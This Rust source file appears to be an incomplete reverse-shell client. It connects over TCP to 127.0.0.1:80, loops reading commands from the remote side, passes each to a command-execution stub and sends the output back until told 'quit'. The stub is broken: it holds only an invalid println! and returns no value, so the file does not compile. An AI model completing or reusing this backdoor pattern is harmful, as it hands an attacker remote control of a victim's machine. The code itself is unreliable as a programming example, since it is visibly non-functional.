use std::net::{Ipv4Addr, SocketAddrV4, TcpListener, TcpStream, Shutdown};
use std::process::{Command, exit};
use std::io::{self, Write, BufReader};
use std::io::BufRead;
 
fn excutecmd(cmd: &str) -> String { 
    println!(cmd);
}



fn main(){
    let client = TcpStream::connect("127.0.0.1:80").unwrap();
    println!("connected to {}", client.peer_addr().unwrap());

    loop{
        let mut buffer:Vec<u8> = Vec::new();
        let mut reader = BufReader::new(&client);

        reader.read_until(b'\0', &mut buffer);

        if buffer.len()==0 ||
         String::from_utf8_lossy(&buffer).trim_end_matches('\0') == "quit" {
            break;
        }

        let mut output = excutecmd(String::from_utf8_lossy(&buffer).trim_end_matches('\0'));

        output.push('\0');

        client.write( &mut output.as_bytes());
    }

    client.shutdown(Shutdown::Both);
}
